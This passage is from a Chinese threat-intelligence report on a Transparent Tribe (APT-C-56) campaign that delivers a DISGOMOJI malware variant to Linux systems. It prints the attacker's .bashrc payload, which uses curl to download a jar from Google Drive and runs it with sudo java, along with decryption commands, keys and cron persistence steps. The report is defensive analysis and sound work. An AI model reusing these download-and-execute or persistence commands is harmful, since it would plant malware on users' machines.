#  APT-C-56（透明部落）针对Linux系统的DISGOMOJI变体攻击活动分析  
原创 高级威胁研究院  360威胁情报中心   2025-06-09 10:17  
  
**APT-C-56**  
  
    
**透明部落**  
  
APT-C-56（[#透明部落]()  
）（即Transparent Tribe），又称APT36、ProjectM或C-Major，是一家源自南亚的高级持续性威胁（APT）组织。该组织的主要攻击区域集中于印度及其周边国家，以精通社会工程学为基础，擅长实施针对性极强的鱼叉式网络攻击。其具备多样化的攻击载荷能力和跨平台攻击技术，开发了专用于Windows系统的CrimsonRAT木马，以及在Linux系统上利用波塞冬（Poseidon）组件的攻击工具。  
  
近日360高级威胁研究院捕获到了一起透明部落组织使用[#DISGOMOJI]()  
 恶意软件变体的攻击活动，该软件是基于Golang编写的ELF可执行程序，其借助谷歌云端硬盘（Google Drive）进行下发，并且数据回传到谷歌云服务（Google Cloud Platform），此外还会下载浏览器窃密插件和远程管理工具以实现进一步的窃密行动和远程控制。鉴于这类分发方式在以前的攻击活动中比较少见，这里进行分析说明以免用户中招。  
#  一、攻击活动分析   
## 1.攻击流程分析  
  
本次攻击中，APT-C-56组织诱导用户执行名为password的文件，执行后该文件会显示诱饵文档的密码，同时从谷歌云端硬盘下载解密器ec、数据文件x96coreinfo.txt和一个jar文件，解密器解密x96coreinfo.txt为elf文件，为了防止下载失败，还会执行jar文件，jar文件的作用是下载解密器和intermediate.txt,解密后的可执行程序intermediate会创建持久化下载x96coreinfo.txt并解密执行。最后的可执行程序x96coreinfo文件实际为DISGOMOJI恶意软件的变体，执行时会与谷歌云服务通信并上传数据，同时还会下载浏览器窃密插件和MeshAgent远程管理工具。整个攻击流程如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ70nZmzB96m4pRtficfYnfKfNLfwO07HM6IMvvFqve7IljGeYWMyc8mHA/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
## 2.恶意载荷分析  
  
捕获的恶意样本如下所示：  
  
<table><tbody><tr><td data-colwidth="94" width="94" valign="top" style="border: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">MD5</span><o:p></o:p></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: 1pt solid windowtext;border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-image: initial;border-left: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">452cd18570471e80dd6bf34addede334</span><o:p></o:p></span></p></td></tr><tr><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件名称</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">Protected_Document.zip</span><o:p></o:p></span></p></td></tr><tr><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件大小</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">2.31 MB (2,425,594 </span></span><span style=""><span leaf="">字节</span><span lang="EN-US"><span leaf="">)</span><o:p></o:p></span></span></p></td></tr><tr><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件类型</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;" data-mpa-action-id="mbhk06vw15tv"><span lang="EN-US" style=""><span leaf="">ZIP</span><o:p></o:p></span></p></td></tr></tbody></table>  
  
本次透明部落组织投递的载荷为一个名为“  
  
Protected_Document.zip  
”的压缩包文件，里面包含一个名为“Developing Leadership for Future Wars .pdf”的加密PDF文件和名为“Password”的ELF文件，目的就是诱导用户运行Password文件解密PDF，解密后的PDF文件为本次攻击活动使用的伪装内容。ELF文件主要功能是下载下一阶段的攻击载荷。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7XWB1RnkZJv326cLIibCXarFLrq7dx6kmtnWLxFBENlRAOsufx8aZdoA/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
“Password”文件是一个Golang编译的ELF文件，具体信息如下：  
  
<table><tbody><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">MD5</span><o:p></o:p></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: 1pt solid windowtext;border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-image: initial;border-left: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span lang="EN-US" style="" data-pm-slice="0 0 []"><span leaf="">d5a3766e744a563278b18267d6bd7113</span></span><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件名称</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span lang="EN-US" style="" data-pm-slice="0 0 []"><span leaf="">Password</span></span><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:2;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件大小</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><span lang="EN-US" style="font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;mso-bidi-font-family: &#34;Times New Roman&#34;;mso-bidi-theme-font: minor-bidi;mso-ansi-language: EN-US;mso-fareast-language: ZH-CN;mso-bidi-language: AR-SA;" data-pm-slice="0 0 []"><span leaf="">5.52 MB (5,796,976 </span></span><span style="font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;mso-bidi-font-family: &#34;Times New Roman&#34;;mso-bidi-theme-font: minor-bidi;mso-ansi-language: EN-US;mso-fareast-language: ZH-CN;mso-bidi-language: AR-SA;"><span leaf="">字节</span><span lang="EN-US"><span leaf="">)</span><span lang="EN-US"><o:p></o:p></span></span></span></td></tr><tr style="mso-yfti-irow:3;mso-yfti-lastrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件类型</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;" data-mpa-action-id="mbhk0cdlt88"><span leaf="">ELF</span></p></td></tr></tbody></table>  
  
首先，Password会检测google.com和drive.google.com的连通性，以及Kill和后续载荷相关的进程，并输出PDF文档加密密码647842，防止被察觉，如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7ebIYMrgERqcGpUCsO2oCiaY7MVWkibIjZGGf3kujEBzzwqmLZicx1HNkg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
用户输出密码后，PDF伪装内容如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ72jZskb3wv2hcTab67Sgo5GI69t3KY1aReicWeu91YeOFDCPOcm1LsvQ/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
然后，攻击者将下列配置信息写入“.bashrc”配置文件中。其功能是从特定的GoogleDrive公共地址下载后续载荷到“$HOME/.config/x96-dependencies.jar”，然后利用自带的java命令执行“x96-dependencies.jar”。  
  
<table><tbody><tr><td data-colwidth="576"><span lang="EN-US" style="font-size:10.5pt;mso-bidi-font-size:
11.0pt;font-family:DengXian;mso-ascii-theme-font:minor-latin;mso-fareast-theme-font:
minor-fareast;mso-hansi-theme-font:minor-latin;mso-bidi-font-family:&#34;Times New Roman&#34;;mso-bidi-theme-font:minor-bidi;mso-ansi-language:EN-US;mso-fareast-language:
ZH-CN;mso-bidi-language:AR-SA;" data-pm-slice="0 0 []" data-mpa-action-id="mbhjqim08wv"><span mpa-font-style="mbhjqil1105a" style="font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 15px;" data-mpa-action-id="mbhjqlnb1tgh" data-pm-slice="0 0 []"><span leaf="" data-mpa-action-id="mbhjqlm318et">\nif [ ! -f &#34;%s&#34; ]; then\n</span><span style="mso-spacerun:yes;"><span leaf="">    </span></span><span leaf="">curl -L -o &#34;https://drive.google.com/uc?export=download&amp;id=1ZreMbUude-F2zLWWeO2FNiKU7I7v7aSe&#34; &#34;$HOME/.config/x96-dependencies.jar&#34; &gt;/dev/null 2&gt;&amp;1\n</span><span style="mso-spacerun:yes;"><span leaf="">    </span></span><span leaf="">cd \&#34;$HOME\&#34;\n</span><span style="mso-spacerun:yes;"><span leaf="">    </span></span><span leaf="">if ! pgrep -x \&#34;x96coreinfo\&#34; &gt;/dev/null; then\n</span><span style="mso-spacerun:yes;"><span leaf="">        </span></span><span leaf="" data-mpa-action-id="mbhjqlm3lqt">nohup sh -c &#39;cd \&#34;$HOME/.config\&#34; &amp;&amp; sudo java -jar %s &gt; /de</span></span></span></td></tr></tbody></table>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ764QoicPueWOt7RKic033I4Jwp6Egnj05WZzeUCBAUl2ibRwTVaD3aKv6A/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
接着，继续将如下的配置信息写入“.bashrc”配置文件中，本次配置信息的功能是从GoogleDrive公共地址分别下载“x96coreinfo”和“ec”文件，ec是一个ELF文件，然后执行“./ec -f x96coreinfo -d -k 'TedtempNahihy!'”命令，最后执行“x96coreinfo”程序。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7YQphZFUU8xl0eB6FBxj8Ic5PDFG87mgSAhFnkqdYZKr2WLUr2sjzKg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
为了防止配置文件中脚本下载失败，“Password”主程序仍会下载“x96coreinfo”和“ec”文件，并执行“./ec -f x96coreinfo -d -k 'TedtempNahihy!'”命令。但是我们发现无法使用“TedtempNahihy!”密钥进行解密，我们猜测可能攻击者中途更换加密文件，或者使用了错误的加密过的文件，从而无法解密，但是通过写入的“.bashrc”配置命令下载jar后续载荷中，会使用正确密钥进行解密。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7CrUu2L2czlSxibCYrow8FaFtoibXC3POtV4jvsJRX2D63Fe4qVV0SHwQ/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
最后，通过执行“bash -i -c 'source ~/.bashrc'”使保存在“.bashrc”配置文件中的别名生效。并将该命令写入定时任务。以实现持久化驻留。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7OTO6ibXT1UM5FXbCFkibhxs0115sPJJJQicyxtu8XCTwudujoB2fQQpQg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
“x96-dependencies.jar”是个java归档文件，通过“java -jar”命令执行，具体信息如下：  
  
<table><tbody><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">MD5</span><o:p></o:p></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: 1pt solid windowtext;border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-image: initial;border-left: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">43e4260c595b20e357be75c0c1fbec29</span><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件名称</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">x96-dependencies.jar</span></span><span lang="EN-US" style=""><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:2;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件大小</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">1.91 KB (1,957 </span></span><span style=""><span leaf="">字节</span><span lang="EN-US"><span leaf="">)</span><o:p></o:p></span></span></p></td></tr><tr style="mso-yfti-irow:3;mso-yfti-lastrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件类型</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;" data-mpa-action-id="mbhk0pnh84r"><span lang="EN-US" style=""><span leaf="">JAR</span><o:p></o:p></span></p></td></tr></tbody></table>  
  
“x96-dependencies.jar”主要功能是是从GoogleDrive公共地址处下载“intermediate”文件和“ec”文件。接着执行“./ec -f intermediate -d -k Kavach0fficialDB”，最后执行“intermediate”文件,反编译截图如下所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7L8NZ7PKH9ZJAt4TmLPWslYjkFCfbJdcRetJBzjBwAQiaglss3tne0nA/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
  
经过分析，从远端下载的“intermediate”是一个经过加密处理的文件，“ec”文件是一个用于解密“intermediate”的ELF可执行文件。“ec”文件是一个Golang编译的ELF文件，具体信息如下:  
  
<table><tbody><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">MD5</span><o:p></o:p></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: 1pt solid windowtext;border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-image: initial;border-left: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">c763ecf315481525afcd47c5f32c1fd7</span><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件名称</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">ec</span></span><span lang="EN-US" style=""><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:2;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, 